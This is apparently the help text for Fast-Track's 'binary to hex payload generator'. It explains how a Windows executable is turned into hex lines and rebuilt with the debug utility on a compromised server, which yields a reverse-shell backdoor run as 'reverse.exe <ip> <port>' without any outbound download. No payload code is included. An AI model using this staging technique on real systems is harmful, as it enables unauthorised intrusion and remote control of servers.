Binary to Hex Payload Generator
***********************************************************************

Requirements: None

To put it simply, in order for a lot of attacks to work you need a 
connection back to get your malicious payload back on the server you
just popped right? This might be a netcat, or a variant that allows
you a interactive shell through the egress points in a firewall. Alot
of times this can be a pain in the rear to get a stable connection to 
download something off. A lot of the techniques out there could be TFTP,
FTP, HTTP GET's, and various other connections that rely off of a stable
egress connection in order to grab the payload...

In the binary to hex payload generator, you can either use one that
we have built into Fast-Track, simply copy and paste the output line
by line, and it will create a reverse.exe file for you. To use this
backdoor simply type:

reverse.exe <ip> <port> (thanks IllWill)

What this tool does for you is convert a normal windows executable
and uses the windows debug feature to compile an executable for you
through echoing into a file. You can use your own (generally the
metasploit payload generator works great). 

The reason for this being so useful is now we don't have to connect
back and get our payload relying off of various other protocols..
Just more of a simple step and can just copy and paste the stuff
into a windows command prompt, and we're done.

This type of attack has already been implemented in the binary payload
SQL Injector tool.
